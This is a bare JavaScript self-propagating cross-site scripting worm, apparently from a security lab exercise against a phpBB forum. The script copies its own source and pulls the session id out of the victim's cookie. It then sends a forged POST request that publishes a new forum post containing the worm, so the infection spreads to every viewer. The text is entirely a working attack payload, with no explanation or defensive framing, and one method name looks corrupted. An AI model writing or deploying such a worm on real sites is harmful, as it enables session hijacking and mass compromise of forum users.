<script id=xss>

var code = document.getElementByIdx_x_x("xss").innerHTML;
var script_head = "<script id=xss>";
var script_end = "<\/script>";
var script = script_head.concat(code, script_end);
script = script.concat("This is a self-propagating XSS worm.");
script = encodeURI(script);

var Ajax = null;

var cookie = document.cookie;
var sid = cookie.substr(cookie.indexOf("sid")-(-4), 32);

// Construct the header information for the Http request.
Ajax = new XMLHttpRequest();
Ajax.open("POST", "http://www.xsslabphpbb.com/posting.php", true);
Ajax.setRequestHeader("Host", "www.xsslabphpbb.com");
Ajax.setRequestHeader("Keep-Alive", "300");
Ajax.setRequestHeader("Connection", "keep-alive");
Ajax.setRequestHeader("Cookie", document.cookie);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// Construct the content. The format of the content can be learned
// from LiveHttpHeader. All we need to fill is subject, message, and sid.
var content = "subject=Self-Propagating+XSS+Worm&addbbcode18=%23444444&addbbcode20=0&helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000&message=".concat(script).concat("&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=").concat(sid).concat("&f=1&post=Submit");

// Send the HTTP POST request.
Ajax.send(content);
</script>